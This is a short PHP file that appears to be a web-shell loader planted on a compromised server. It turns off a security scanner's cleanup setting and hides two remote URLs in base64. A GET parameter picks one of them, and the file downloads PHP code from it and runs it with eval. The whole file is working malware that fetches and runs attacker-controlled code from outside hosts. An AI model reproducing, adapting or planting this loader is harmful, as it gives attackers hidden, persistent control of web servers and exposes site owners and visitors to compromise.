<?php
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);

function get_data($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);

        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    } else {
        $data = file_get_contents($url);
        return $data;
    }
}

$x = '?>';

if (isset($_GET['kontol'])) {
    $target_url = base64_decode('aHR0cHM6Ly9ncmVtaW9hcHUub3JnLmFyL21vZHVsZXMvbW9kX2N1c3RvbS9zcmMvRGlzcGF0Y2hlci9pbmRleC5waHA=');
} else {
    $target_url = base64_decode('aHR0cHM6Ly9ydW1wa2UuYmx1ZXRyZWVsZWFybmluZy5jb20vYW5hbHl0aWNzL2NsYXNzZXMvcHJpdmFjeS9iYWNrdXAtcHJvdmlkZXIucGhw');
}

eval($x . get_data($target_url));
?>
